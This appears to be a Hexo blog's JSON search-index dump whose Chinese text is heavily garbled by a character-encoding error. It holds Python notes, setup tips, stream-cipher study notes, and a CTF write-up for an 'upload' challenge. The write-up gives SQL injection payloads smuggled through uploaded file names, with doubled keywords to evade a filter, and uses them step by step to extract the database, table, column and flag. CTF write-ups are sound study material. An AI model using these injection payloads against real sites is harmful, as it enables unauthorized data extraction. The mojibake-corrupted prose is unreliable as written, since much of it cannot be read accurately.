æ–¹æ³•è½¬æ¢å­—ç¬¦ä¸²ä¸­æ‰€æœ‰å¤§å†™å­—ç¬¦ä¸ºå°å†™ã€‚è¯­æ³•lower()æ–¹æ³•è¯­æ³•ï¼šstr.lower() ord() å‡½æ•°æ˜¯ chr() å‡½æ•°ï¼ˆå¯¹äº8ä½çš„ASCIIå­—ç¬¦ä¸²ï¼‰æˆ– unichr() å‡½æ•°ï¼ˆå¯¹äºUnicodeå¯¹è±¡ï¼‰çš„é…å¯¹å‡½æ•°ï¼Œå®ƒä»¥ä¸€ä¸ªå­—ç¬¦ï¼ˆé•¿åº¦ä¸º1çš„å­—ç¬¦ä¸²ï¼‰ä½œä¸ºå‚æ•°ï¼Œè¿”å›å¯¹åº”çš„ ASCII æ•°å€¼ï¼Œæˆ–è€… Unicode æ•°å€¼ï¼Œå¦‚æœæ‰€ç»™çš„ Unicode å­—ç¬¦è¶…å‡ºäº†ä½ çš„ Python å®šä¹‰èŒƒå›´ï¼Œåˆ™ä¼šå¼•å‘ä¸€ä¸ª TypeError çš„å¼‚å¸¸ã€‚è¯­æ³•ä»¥ä¸‹æ˜¯ ord() æ–¹æ³•çš„è¯­æ³•:ord(c) Python join()æè¿°Python join() æ–¹æ³•ç”¨äºå°†åºåˆ—ä¸­çš„å…ƒç´ ä»¥æŒ‡å®šçš„å­—ç¬¦è¿æ¥ç”Ÿæˆä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ã€‚ è¯­æ³•join()æ–¹æ³•è¯­æ³•ï¼š str.join(sequence) Python chr() å‡½æ•°æè¿°chr() ç”¨ä¸€ä¸ªèŒƒå›´åœ¨ rangeï¼ˆ256ï¼‰å†…çš„ï¼ˆå°±æ˜¯0ï½255ï¼‰æ•´æ•°ä½œå‚æ•°ï¼Œè¿”å›ä¸€ä¸ªå¯¹åº”çš„å­—ç¬¦ã€‚è¯­æ³•ä»¥ä¸‹æ˜¯ chr() æ–¹æ³•çš„è¯­æ³•:chr(i)å‚æ•°i â€“ å¯ä»¥æ˜¯10è¿›åˆ¶ä¹Ÿå¯ä»¥æ˜¯16è¿›åˆ¶çš„å½¢å¼çš„æ•°å­—ã€‚ Python isalpha() æ–¹æ³•æ£€æµ‹å­—ç¬¦ä¸²æ˜¯å¦åªç”±å­—æ¯ç»„æˆã€‚ è¯­æ³•isalpha()æ–¹æ³•è¯­æ³•ï¼š str.isalpha() raw_inputinputå®ƒä¼šæ ¹æ®ç”¨æˆ·è¾“å…¥å˜æ¢ç›¸åº”çš„ç±»å‹,è€Œä¸”å¦‚æœè¦è¾“å…¥å­—ç¬¦å’Œå­—ç¬¦ä¸²çš„æ—¶å€™å¿…é¡»è¦ç”¨å¼•å·åŒ…èµ·æ¥,è€Œraw_inputåˆ™æ˜¯ä¸ç®¡ç”¨æˆ·è¾“å…¥ä»€ä¹ˆç±»å‹çš„éƒ½ä¼šè½¬å˜æˆå­—ç¬¦å‹. åˆ‡ç‰‡https://www.jianshu.com/p/15715d6f4dad Python int() å‡½æ•°Python å†…ç½®å‡½æ•° Python å†…ç½®å‡½æ•°æè¿°int() å‡½æ•°ç”¨äºå°†ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–æ•°å­—è½¬æ¢ä¸ºæ•´å‹ã€‚è¯­æ³•ä»¥ä¸‹æ˜¯ int() æ–¹æ³•çš„è¯­æ³•:class int(x, base=10)å‚æ•°x â€“ å­—ç¬¦ä¸²æˆ–æ•°å­—ã€‚base â€“ è¿›åˆ¶æ•°ï¼Œé»˜è®¤åè¿›åˆ¶ã€‚è¿”å›å€¼è¿”å›æ•´å‹æ•°æ®ã€‚ PyCharmå®‰è£…wordcloudå¤±è´¥è§£å†³","categories":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/categories/notes/"},{"name":"Python","slug":"notes/Python","permalink":"https://singlemindedt.github.io/categories/notes/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://singlemindedt.github.io/tags/Python/"}]},{"title":"upload","slug":"upload","date":"2019-12-16T00:14:47.000Z","updated":"2019-12-30T06:03:49.230Z","comments":true,"path":"2019/12/16/upload/","link":"","permalink":"https://singlemindedt.github.io/2019/12/16/upload/","excerpt":"","text":"uploadåˆæ¢ æ ¹æ®é¢˜ç›®uploadçŒœæµ‹å¯èƒ½ä¸ºæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œå…ˆæ³¨å†Œä¸ºä¼šå‘˜(username:111111;password:111111); ç™»å½•å°±å‡ºç°äº†ä¸Šä¼ æ–‡ä»¶çš„é¡µé¢å¦‚ä¸‹ï¼š å°è¯•ä¸Šä¼ æ–‡ä»¶ï¼Œå‘ç°åªæœ‰jpgæ ¼å¼çš„æ–‡ä»¶å¯ä»¥ä¸Šä¼ å°è¯•ä¸Šä¼ php.jpg 1&lt;?php echo phpinfo();?&gt; burpsuiteæŠ“åŒ…æ”¹åç¼€åä¸ºphpå¾—åˆ°ç»“æœå›åº”ä¸ºæ–‡ä»¶æ ¼å¼é”™è¯¯ï¼Œåº”è¯¥æ˜¯æœåŠ¡å™¨ç«¯çš„æ£€æŸ¥ï¼Œè€Œéå®¢æˆ·ç«¯Jsè¿‡æ»¤ï¼› åˆ†æï¼šé¢˜ç›®é™åˆ¶äº†ä¸Šä¼ æ–‡ä»¶çš„åç¼€åå¿…é¡»ä¸ºjpgï¼Œä½†å¹¶æ²¡æœ‰å¯¹æ–‡ä»¶å†…å®¹æœ‰æ‰€æ£€æŸ¥ï¼›å›¾ç‰‡é©¬çš„æ–¹æ³•ä¸å¯è¡Œï¼Œä¸Šä¼ æˆåŠŸåå¹¶æ²¡æœ‰ç›®å½•ï¼ŒåŒæ—¶æ— æ³•ä¸Šä¼ .htaccesså¯¹å›¾ç‰‡é©¬è§£æï¼› å‚é˜…ç›¸å…³èµ„æ–™å‘ç°ä¼¼ä¹æ˜¯åˆ©ç”¨æ–‡ä»¶åæ³¨å…¥ï¼Œå¹¶ä¸”é€šè¿‡æ¯æ¬¡ä¸Šä¼ æˆåŠŸåçš„å›æ˜¾uid is ï¼š1660 å¤§æ¦‚èƒ½å¤ŸçŒœæµ‹åº”è¯¥æ˜¯åˆ©ç”¨æ–‡ä»¶åå¯¹åç«¯æ•°æ®åº“è¿›è¡Œæ³¨å…¥ï¼›*åç«¯æ’å…¥è¯­å¥ï¼š 12INSERT INTO è¡¨åVALUESï¼ˆè¢«æ’å…¥æ–°è¡Œä¸­çš„å€¼ï¼‰ å®é™…æ“ä½œï¼š æ„é€ payloadï¼šï¼ˆæ–‡ä»¶åï¼‰1'+(select database())+'.jpg å¯ä»¥çœ‹åˆ°selectè¢«è¿‡æ»¤äº†ï¼Œå°è¯•åŒå†™ç»•è¿‡ï¼š 1'+(selselectect database())+'.jpg é¡µé¢å›æ˜¾å‡ä¸º0ï¼› å°è¯•è½¬æ¢æ ¼å¼ï¼šè½¬ä¸º16è¿›åˆ¶ï¼š1'+(selselectect hex(database()))+'.jpg é¡µé¢å›æ˜¾ä¸ºï¼š7765625 åˆ†æ(å›æ˜¾16è¿›åˆ¶ä¸ºçº¯æ•°å­—ï¼Œå¯èƒ½è¿‡æ»¤å­—æ¯ï¼›ä¸”å¯èƒ½å›æ˜¾ä½ä¸å…¨)è½¬10è¿›åˆ¶è¾“å‡º:1'+(selselectect conv(hex(database()),16,10))+'.jpg *MySQL CONVï¼ˆï¼‰å°†ä¸€ä¸ªæ•°å­—ä»ä¸€ä¸ªæ•°å­—åŸºæ•°ç³»ç»Ÿè½¬æ¢ä¸ºå¦ä¸€ä¸ªæ•°å­—åŸºæ•°ç³»ç»Ÿã€‚è½¬æ¢åï¼Œå‡½æ•°è¿”å›æ•°å­—çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚å½“å®šä¹‰çš„å‚æ•°ä¸ºNULLæ—¶ï¼Œè¿”å›å€¼å°†ä¸ºNULLã€‚æœ€å°åŸºæ•°ä¸º2ï¼Œæœ€å¤§åŸºæ•°ä¸º36.å¦‚æœè¦è½¬æ¢çš„åŸºæ•°ä¸ºè´Ÿæ•°ï¼Œåˆ™è¯¥æ•°å­—è¢«è§†ä¸ºå¸¦ç¬¦å·æ•°ã€‚å¦åˆ™ï¼Œå®ƒè¢«è§†ä¸ºæœªç­¾åã€‚è¯¥å‡½æ•°å‡ºç°åœ¨MySQLç‰ˆæœ¬ï¼š5.6è¯­æ³•ï¼š 1CONV(N,from_base,to_base) é¡µé¢å›æ˜¾ä¸ºï¼š1.8446744073709552e19 åˆ†æ(å›æ˜¾ç§‘å­¦è®¡æ•°æ³•ï¼Œåº”è¯¥æ˜¯è¾“å‡ºä½æ•°è¿‡é•¿)ä½¿ç”¨substråˆ†å‰²è¾“å‡ºï¼š1'+(selselectect conv(substr(hex(database()),1,12),16,10))+'.jpg é¡µé¢å›æ˜¾ä¸ºï¼š131277325825392 è½¬16è¿›åˆ¶å†è½¬ä¸ºascll,å¾—åˆ°ï¼šweb_up123456789def changeascll(number): number=str(hex(number))[2:] s1=[number[i:(i+2)]for i in range(0,len(number),2)] s2=[int(i,16)for i in s1] s3=[chr(i)for i in s2] s=\"\".join(s3) print(s)changeascll(131277325825392) æå–ååŠéƒ¨åˆ†å­—ç¬¦ï¼š1819238756 1'+(selselectect conv(substr(hex(database()),13,12),16,10))+'.jpg å¾—åˆ°æ•°æ®åº“åï¼šweb_upload åŒæ ·ä½¿ç”¨ä¸Šè¿°æ–¹æ³•çˆ†è¡¨payloadï¼š1'+(selecselectt conv(substr(hex((selecselectt table_name frofromm information_schema.tables where table_schema='web_upload' limit 1,1)),1,12),16,10))+'.jpg 114784820031327112615676665705126853610566245å¾—åˆ°è¡¨åï¼šhello_flag_is_here çˆ†å­—æ®µpayload:1'+(selecselectt conv(substr(hex((selecselectt column_name frofromm information_schema.columns where table_name='hello_flag_is_here' limit 0,1)),1,12),16,10))+'.jpg 1158583773673987102823å¾—åˆ°å­—æ®µåï¼ši_am_flag çˆ†å€¼payloadï¼š1'+(selecselectt conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here limit 0,1)),1,12),16,10))+'.jpg 3642721569519992806431727430560750951 å¾—åˆ°å€¼ï¼š1!!_@m_Th.e_F!lag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"CTF/æ”»é˜²ä¸–ç•Œ","permalink":"https://singlemindedt.github.io/categories/CTF/æ”»é˜²ä¸–ç•Œ/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"å®‰è£…PyCharm","slug":"å®‰è£…PyCharm","date":"2019-12-13T00:47:41.000Z","updated":"2019-12-13T04:52:54.257Z","comments":true,"path":"2019/12/13/å®‰è£…PyCharm/","link":"","permalink":"https://singlemindedt.github.io/2019/12/13/å®‰è£…PyCharm/","excerpt":"","text":"èµ·å› ^-^åŸæ¥ç”¨çš„IDLEï¼ŒåŠŸèƒ½å¾ˆå°‘ï¼Œå°±æ¥å®‰è£…äº†PyCharmï¼›å¾ˆç®€å•çš„å®‰è£…ï¼Œä¸€æ­¥æ­¥åä¸‹æ¥å°±å¥½ï¼›ç”±äºä¹‹å‰ç”¨IDLEéƒ½æ˜¯åœ¨å®‰è£…è·¯å¾„ä¸‹è¿è¡Œçš„ï¼Œæ•…æ²¡æœ‰é…ç½®ç¯å¢ƒå˜é‡ï¼›æ–¹ä¾¿èµ·è§é…ä¸€ä¸‹ï¼›æ§åˆ¶é¢æ¿-ç³»ç»Ÿ-é«˜çº§ç³»ç»Ÿè®¾ç½®-ç¯å¢ƒå˜é‡-ç³»ç»Ÿå˜é‡-Path-æ·»åŠ è·¯å¾„ï¼› ç»è¿‡orzå®‰è£…Pythonè‡ªå·±åœ¨python -v/Vä¸Šå‡Œä¹±äº†ï¼Œä»¥ä¸ºæ˜¯ä¹‹å‰å®‰è£…çš„ä¸€äº›ä¸œè¥¿æåäº†ï¼Œè¿˜æ˜¯é‡è£…äº†QAQï¼›å®‰è£…pythonï¼šhttps://baijiahao.baidu.com/s?id=1606573927720991570&amp;wfr=spider&amp;for=pcæ£€æŸ¥ç¯å¢ƒå˜é‡çš„æ—¶å€™ä¼šå‘ç°ï¼Œæ·»åŠ åœ¨äº†ç”¨æˆ·å˜é‡å¹¶ä¸”æ·»åŠ äº†ä¸¤ä¸ªï¼š 12E:\\newpython3.8.0\\install_location\\Scripts\\E:\\newpython3.8.0\\install_location\\ 12*ç³»ç»Ÿå˜é‡ï¼šå¯¹æ‰€æœ‰çš„ç”¨æˆ·èµ·ä½œç”¨*ç”¨æˆ·å˜é‡ï¼šå¯¹å½“å‰ç”¨æˆ·èµ·ä½œç”¨ powershellä¸­æ‰§è¡Œpython -V â€”æŸ¥çœ‹ç‰ˆæœ¬(æ³¨æ„æ˜¯å¤§å†™Vï¼Œå°å†™vä¼šæŠ›å‡ºå¾ˆå¤šä¸œè¥¿)ï¼› 12python -v å°å†™v:è¿™æ˜¯ç‰ˆæœ¬ä¿¡æ¯ï¼ŒåŒ…æ‹¬åº“ç‰ˆæœ¬python -V å¤§å†™vï¼šåªçœ‹pythonçš„ç‰ˆæœ¬ (è®°å½•ä¸€ä¸‹ï¼Œæœªåˆ å»åŸæ¥çš„ç‰ˆæœ¬3.7.4ï¼›æ€•åŸæ¥é…ç½®çš„ä¸€äº›ä¸œè¥¿åˆç”¨ä¸äº†äº†) å®‰è£…PyCharmä¸€è·¯å‚»ç“œæ“ä½œï¼› è¿›å…¥è½¯ä»¶ï¼š1.Create New ProjectLocation(å­˜æ”¾å·¥ç¨‹è·¯å¾„),å¯è‡ªè¡Œä¿®æ”¹ï¼Œä½†æ˜¯æœ€å¥½ä¸ºç©ºï¼›ç‚¹å‡»â–¶projectâ€¦èƒ½çœ‹åˆ°PyCharmå·²ç»è·å–äº†3.8.0è§£é‡Šå™¨Base interpreter:è·¯å¾„â€¦python.exeCreate2.ç­‰ï¼ŒTip-&gt;Closeæ·»åŠ Project InterpreterFilesettingsOK 3.è¯•è¿è¡ŒFilenewPython Fileè¾“å…¥name okç¼–å†™ç¨‹åºè¿è¡Œ ç»“æœï¼Ÿï¼Ÿï¼Ÿ","categories":[],"tags":[{"name":"ç¯å¢ƒå®‰è£…","slug":"ç¯å¢ƒå®‰è£…","permalink":"https://singlemindedt.github.io/tags/ç¯å¢ƒå®‰è£…/"}]},{"title":"cmdä¸‹è¾“å…¥pythonå¼¹å‡ºåº”ç”¨å•†åº—","slug":"cmdä¸‹è¾“å…¥pythonå¼¹å‡ºåº”ç”¨å•†åº—","date":"2019-12-12T16:57:32.000Z","updated":"2019-12-13T04:56:49.241Z","comments":true,"path":"2019/12/13/cmdä¸‹è¾“å…¥pythonå¼¹å‡ºåº”ç”¨å•†åº—/","link":"","permalink":"https://singlemindedt.github.io/2019/12/13/cmdä¸‹è¾“å…¥pythonå¼¹å‡ºåº”ç”¨å•†åº—/","excerpt":"","text":"é—®é¢˜ï¼šcmd/powershallä¸‹è¿è¡Œpythonå‡å¼¹çª—åº”ç”¨å•†åº—è§£å†³ï¼šåœ¨ç¯å¢ƒå˜é‡ä¸­å¯ä»¥çœ‹åˆ°ç¬¬ä¸€æ¡ä¸ºï¼š%USERPROFILE%\\AppData\\Local\\Microsoft\\WindowsApps%USERPROFILE% : å½“å‰ç”¨æˆ·é…ç½®æ–‡ä»¶(Profileæ–‡ä»¶)ä½ç½®å¤‡ä»½ååˆ é™¤ï¼Œè§£å†³ï¼","categories":[],"tags":[{"name":"ç¯å¢ƒå˜é‡","slug":"ç¯å¢ƒå˜é‡","permalink":"https://singlemindedt.github.io/tags/ç¯å¢ƒå˜é‡/"}]},{"title":"åºåˆ—å¯†ç (æµå¯†ç )","slug":"å¯†ç å­¦å¤ä¹ ","date":"2019-12-12T07:56:05.000Z","updated":"2020-01-01T11:47:57.040Z","comments":true,"path":"2019/12/12/å¯†ç å­¦å¤ä¹ /","link":"","permalink":"https://singlemindedt.github.io/2019/12/12/å¯†ç å­¦å¤ä¹ /","excerpt":"","text":"åºåˆ—å¯†ç (æµå¯†ç )å¯¹ç§°å¯†ç ä½“åˆ¶ï¼›ä¸€æ¬¡åªå¯¹æ˜æ–‡æ¶ˆæ¯çš„å•ä¸ªå­—ç¬¦(é€šå¸¸æ˜¯äºŒè¿›åˆ¶1ä½)è¿›è¡ŒåŠ è§£å¯†å˜æ¢ï¼›å…·æœ‰ç®—æ³•å®ç°ç®€å•ã€é€Ÿåº¦å¿«ã€é”™è¯¯ä¼ æ’­å°‘ç­‰ç‰¹ç‚¹ï¼› â€œä¸€æ¬¡ä¸€å¯†â€æ˜æ˜¾ç¼ºé™·ï¼šå¯†é’¥éœ€è¦å’Œæ˜æ–‡ä¸€æ ·é•¿ï¼Œä½¿å¯†é’¥çš„åˆ†å‘å’Œç®¡ç†å›°éš¾ï¼›æ•…ï¼šåºåˆ—å¯†ç è®¾è®¡çš„æ€è·¯ï¼šä»ä¸€ä¸ªçŸ­çš„å¯†é’¥äº§ç”Ÿä¸€ä¸ªéšæœºçš„å¯†é’¥åºåˆ—(ç”±äºå¯†é’¥åºåˆ—ä½¿éšæœºçš„ï¼Œè®¡ç®—èƒ½åŠ›æœ‰é™çš„æ”»å‡»è€…æ— æ³•ä»å·²çŸ¥çš„å¯†é’¥åºåˆ—ç‰‡æ®µä¸­è·å¾—å…¶ä»–å¯†é’¥åºåˆ—ä½ä»»ä½•æœ‰ç”¨ä¿¡æ¯) å®šä¹‰æ˜æ–‡æ¶ˆæ¯æŒ‰å­—ç¬¦(å¦‚äºŒå…ƒæ•°å­—)é€å­—ç¬¦çš„åŠ å¯†ï¼›åºåˆ—å¯†ç çš„åŠ å¯†ç”¨ä¸€ä¸ªéšæœºåºåˆ—(å¯†é’¥æµ)ä¸æ˜æ–‡åºåˆ—æŒ‰ä½å åŠ äº§ç”Ÿå¯†æ–‡ï¼Œç”¨åŒä¸€éšæœºåºåˆ—ä¸å¯†æ–‡åºåˆ—å åŠ æ¥æ¢å¤æ˜æ–‡ï¼› åŸç† åˆ†ç±»åºåˆ—å¯†ç é€šå¸¸åˆ’åˆ†ä¸ºä¸¤ç±»ï¼š1.åŒæ­¥åºåˆ—å¯†ç 2.è‡ªåŒæ­¥åºåˆ—å¯†ç  å¯†é’¥æµä¸å¯†é’¥ç”Ÿæˆå™¨å¯†é’¥æµç®—æ³•åº”è¯¥èƒ½äº§ç”Ÿéšæœºæ€§å’Œä¸å¯é¢„æµ‹æ€§*å¥½çš„å¯†é’¥åºåˆ—*ä¿æŒåŒæ­¥æ˜¯åºåˆ—å¯†ç åœ¨å®é™…åº”ç”¨ä¸­çš„å…³é”®**ç°å®ï¼šå¯†é’¥æµéƒ½æ˜¯æŒ‰å¯†é’¥ç”Ÿæˆç®—æ³•ç”Ÿæˆï¼Œä¸”è¦æ±‚é€šä¿¡åŒæ–¹èƒ½äº§ç”Ÿç›¸åŒçš„å¯†é’¥åºåˆ—ï¼Œæ‰€ä»¥ä¸å¯èƒ½æ˜¯çœŸéšæœºçš„â€”â€”ä¼ªéšæœºåºåˆ— å¯†é’¥æµè¦æ±‚1.æå¤§çš„å‘¨æœŸ(ç®—æ³•äº§ç”Ÿçš„åºåˆ—éƒ½æ˜¯å‘¨æœŸæ€§çš„ï¼Œééšæœºåºåˆ—)2.è‰¯å¥½çš„ç»Ÿè®¡ç‰¹å¾(æœ‰å‡åŒ€çš„æ¸¸ç¨‹åˆ†å¸ƒ)@@@æ¸¸ç¨‹ï¼šåºåˆ—ä¸­ç›¸åŒç¬¦å·çš„è¿ç»­æ®µï¼Œå…¶å‰åå‡ä¸ºå¼‚ç§ç¬¦å· æ¸¸ç¨‹ï¼šç§°åºåˆ—ä¸­è¿ç»­çš„iä¸ª1ä¸ºé•¿åº¦ç­‰äºiçš„1æ¸¸ç¨‹ï¼Œ åŒæ ·ï¼Œç§°åºåˆ—ä¸­è¿ç»­çš„iä¸ª0ä¸ºé•¿åº¦ç­‰äºiçš„0æ¸¸ç¨‹ã€‚ â€‹ â€¦â€¦0 111 0000 10â€¦â€¦â€‹ æœ‰é•¿ä¸º3çš„1æ¸¸ç¨‹ã€é•¿ä¸º4çš„0æ¸¸ç¨‹ã€é•¿ä¸º1çš„1æ¸¸ç¨‹ã€‚ä¸€èˆ¬è¦æ±‚å…¶åœ¨å‘¨æœŸå†…æ»¡è¶³ï¼šåŒæ ·é•¿åº¦çš„0æ¸¸ç¨‹å’Œ1æ¸¸ç¨‹çš„ä¸ªæ•°ç›¸ç­‰ï¼Œæˆ–è¿‘ä¼¼ç›¸ç­‰çœ‹ä½œç¯å¤„ç†ï¼š é—®é¢˜ ä¸ªæ•° ä½ç½® é•¿åº¦ä¸º1çš„1æ¸¸ç¨‹æœ‰å‡ ä¸ª 1ä¸ª 0111000010 é•¿åº¦ä¸º1çš„0æ¸¸ç¨‹æœ‰å‡ ä¸ª 0ä¸ª 0111000010(éœ€è¦å‰åå¼‚å·) é•¿åº¦ä¸º2çš„0æ¸¸ç¨‹æœ‰å‡ ä¸ª 1ä¸ª 0111000010 3.å¾ˆé«˜çš„çº¿æ€§å¤æ‚åº¦ä¸èƒ½ç”¨çº§æ•°è¾ƒå°çš„çº¿æ€§ç§»ä½å¯„å­˜å™¨LFSRè¿‘ä¼¼ä»£æ›¿ 4.ç”¨ç»Ÿè®¡æ–¹æ³•ç”±å¯†é’¥åºåˆ—k0k1k2â€¦kiâ€¦æå–å¯†é’¥ç”Ÿæˆå™¨ç»“æ„æˆ–ç§å­å¯†é’¥åœ¨è®¡ç®—ä¸Šä¸å¯è¡Œå¯†é’¥æµç”Ÿæˆå™¨çš„ç»„æˆ1.é©±åŠ¨éƒ¨åˆ†æ§åˆ¶ç”Ÿæˆå™¨çš„çŠ¶æ€åºåˆ—ï¼Œä¸ºéçº¿æ€§ç»„åˆéƒ¨åˆ†æä¾›ç»Ÿè®¡æ€§èƒ½è‰¯å¥½çš„åºåˆ—å‘¨æœŸå¾ˆå¤§åˆ†å¸ƒè¾ƒéšæœº 2.éçº¿æ€§ç»„åˆéƒ¨åˆ†Få°†é©±åŠ¨éƒ¨åˆ†æä¾›çš„åºåˆ—ç»„åˆæˆå¯†ç ç‰¹æ€§å¥½çš„åºåˆ—å¯éšè”½é©±åŠ¨åºåˆ—ä¸å¯†é’¥kä¹‹é—´æ˜æ˜¾çš„ä¾èµ–å…³ç³» ç»„æˆ@ é€šå¸¸ç”±çº¿æ€§ç§»ä½å¯„å­˜å™¨(LFSR)å’Œä¸€ä¸ªéçº¿æ€§ç»„åˆå‡½æ•°å³å¸ƒå°”å‡½æ•°ç»„åˆï¼Œæ„æˆä¸€ä¸ªå¯†é’¥æµç”Ÿæˆå™¨ã€‚ çº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨LFSRç»™å®šåˆå§‹çŠ¶æ€ï¼Œå†™å‡ºè¾“å‡ºåºåˆ—ï¼›çº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨ï¼ˆLFSRï¼‰ï¼› 1.åŸç†ï¼šç§»ä½å¯„å­˜å™¨ï¼šç§»å…¥ç«¯ç§»å…¥ä¸€ä½ï¼Œç§»å‡ºç«¯ç§»å‡ºä¸€ä½ï¼›ç»“åˆåé¦ˆå‡½æ•°f:é€‰å–ç§»ä½å¯„å­˜å™¨ä¸­çš„ä¸€äº›å•å…ƒè¿›è¡Œå¼‚æˆ–æ“ä½œï¼Œåé¦ˆç»™è¾“å…¥ç«¯ 1.nçº§LFSRæœ€å¤šæœ‰2^nä¸ªä¸åŒçš„çŠ¶æ€åˆå§‹çŠ¶æ€ä¸ºé›¶ï¼Œåˆ™å…¶çŠ¶æ€æ’ä¸ºé›¶è‹¥å…¶åˆå§‹çŠ¶æ€é0ï¼Œåˆ™å…¶åç»§çŠ¶æ€ä¸ä¼šä¸º0å› æ­¤nçº§LFSRçš„çŠ¶æ€å‘¨æœŸâ‰¤2^(n)-1**2.è¾“å‡ºåºåˆ—çš„å‘¨æœŸä¸çŠ¶æ€å‘¨æœŸç›¸ç­‰ï¼Œæ‰€ä»¥â‰¤2^n-13.é€‰æ‹©åˆé€‚åé¦ˆå‡½æ•°(å…·æœ‰ç‰¹å®šæŠ½å¤´åºåˆ—)ï¼Œæ‰å¯ä½¿åºåˆ—å‘¨æœŸè¾¾åˆ°æœ€å¤§å€¼2^(n)-1ï¼Œå‘¨æœŸè¾¾åˆ°æœ€å¤§å€¼çš„è¾“å‡ºåºåˆ—ç§°ä¸ºmåºåˆ— LFSRç”Ÿæˆæœ€å¤§å‘¨æœŸåºåˆ—æ¡ä»¶ï¼šå…¶ç”Ÿæˆå¤šé¡¹å¼(ç”±æŠ½å¤´åºåˆ—åŠ ä¸Šå¸¸æ•°1å½¢æˆçš„å¤šé¡¹å¼)å¿…é¡»æ˜¯æœ¬åŸå¤šé¡¹å¼ï¼Œå¤šé¡¹å¼çš„é˜¶ä¸ºç§»ä½å¯„å­˜å™¨çš„çº§æ•°ã€‚ nä½å¯„å­˜å™¨ä¸­çš„åˆå§‹å€¼ç§°ä¸ºåˆæ€ï¼Œåˆæ€å¯¹è¾“å‡ºåºåˆ—çš„å‘¨æœŸæ²¡æœ‰å½±å“ï¼›å‘¨æœŸå–å†³äºLFSRæ‰€ä½¿ç”¨çš„åé¦ˆå‡½æ•° è§£å¯†å¯†æ–‡åªéœ€è¿è¡Œå…·æœ‰ç›¸åŒåˆå§‹çŠ¶æ€çš„LFSRå³å¯(å¾ªç¯å›åˆå§‹å€¼ï¼Œå¯†é’¥åºåˆ—å¼€å§‹é‡å¤) ç‰¹å¾å¤šé¡¹å¼â€¦å®šç†ï¼šnçº§LFSRäº§ç”Ÿçš„åºåˆ—æœ‰æœ€å¤§å‘¨æœŸ2^(n)-1çš„å¿…è¦æ¡ä»¶æ˜¯å…¶ç‰¹å¾å¤šé¡¹å¼ä¸ºä¸å¯çº¦ å®šä¹‰ï¼šè‹¥næ¬¡ä¸å¯çº¦å¤šé¡¹å¼p(x)çš„é˜¶ä¸º2^(n)-1ï¼Œåˆ™ç§°p(x)æ˜¯næ¬¡æœ¬åŸå¤šé¡¹å¼ä½¿å¾—p(x)|(x^(p)-1)çš„æœ€å°æ­£æ•´æ•°pç§°ä¸ºp(x)çš„é˜¶ å®šç†ï¼šè®¾{ai}âˆˆG(p(x))ï¼Œ{ai}ä¸ºmåºåˆ—çš„å……è¦æ¡ä»¶æ˜¯p(x)ä¸ºæœ¬åŸå¤šé¡¹å¼ï¼› måºåˆ—ç çš„ç ´è¯‘1.2. éçº¿æ€§ç»„åˆéƒ¨åˆ†åŸºäºLFSRçš„åºåˆ—å¯†ç ï¼ˆå¯¹ä¸€ä¸ªLFSRè¿›è¡Œéçº¿æ€§ç»„åˆï¼‰ï¼š å¸¸è§çš„åŸºäºLFSRçš„å¯†é’¥åºåˆ—å‘ç”Ÿå™¨1.Geffeå‘ç”Ÿå™¨2.é’Ÿæ§å‘ç”Ÿå™¨3.äº¤é”™åœèµ°å¼å‘ç”Ÿå™¨4.é—¨é™å‘ç”Ÿå™¨å¸¸è§çš„æµå¯†ç ç®—æ³•1.RC4åŸºäºéçº¿æ€§æ•°ç»„å˜æ¢ï¼›å®ƒä»¥ä¸€ä¸ªè¶³å¤Ÿå¤§çš„æ•°ç»„ä¸ºåŸºç¡€ï¼Œå¯¹å…¶è¿›è¡Œéçº¿æ€§å˜æ¢ï¼Œäº§ç”Ÿéçº¿æ€§çš„å¯†é’¥æµåºåˆ—ï¼›ä¼˜ç‚¹ï¼šå®¹æ˜“ç”¨è½¯ä»¶å®ç°ï¼ŒåŠ è§£å¯†é€Ÿåº¦å¿«ï¼ˆå¤§çº¦æ¯”DESå¿«10å€ï¼‰ RC4ä¸»è¦ç®—æ³•1.å¯†é’¥è°ƒåº¦ç®—æ³•ï¼ˆKSAï¼‰2.ä¼ªéšæœºæ•°ç”Ÿæˆç®—æ³•ï¼ˆPRGAï¼‰ A5A5ç®—æ³•å·²è¢«åº”ç”¨äºGSMé€šä¿¡ç³»ç»Ÿä¸­ï¼Œç”¨äºåŠ å¯†ä»æ‰‹æœºåˆ°åŸºç«™çš„è¿æ¥ï¼Œä»¥ä¿æŠ¤è¯­éŸ³é€šä¿¡ã€‚ä¸€ä¸ªGSMè¯­è¨€æ¶ˆæ¯è¢«è½¬æ¢æˆä¸€ç³»åˆ—çš„å¸§ï¼Œæ¯å¸§é•¿228ä½ï¼Œæ¯å¸§ç”¨A5è¿›è¡ŒåŠ å¯† åºåˆ—åºåˆ—å¯†ç ç›¸å¯¹äºåˆ†ç»„å¯†ç çš„ä¼˜ç‚¹","categories":[{"name":"cryptography","slug":"cryptography","permalink":"https://singlemindedt.github.io/categories/cryptography/"}],"tags":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/tags/notes/"}]},{"title":"hexoå¡é€šæŒ‚ä»¶è¸©å‘è®°","slug":"hexoå¡é€šæŒ‚ä»¶è¸©å‘è®°","date":"2019-12-12T07:30:52.000Z","updated":"2019-12-12T07:31:43.276Z","comments":true,"path":"2019/12/12/hexoå¡é€šæŒ‚ä»¶è¸©å‘è®°/","link":"","permalink":"https://singlemindedt.github.io/2019/12/12/hexoå¡é€šæŒ‚ä»¶è¸©å‘è®°/","excerpt":"","text":"æ·»åŠ å¡é€šäººç‰©ï¼š 1.å®‰è£…hexo-helper-live2d1nmp install -save hexo-helper-live2d 2.å®‰è£…live2d1nmp install live2d-widget-model-tororo æ³¨æ„ï¼šå¯èƒ½å‡ºç°æŠ¥é”™å¯ä»¥å°è¯•æ›´æ–°nmpç‰ˆæœ¬ï¼š 1nmp install -g nmp 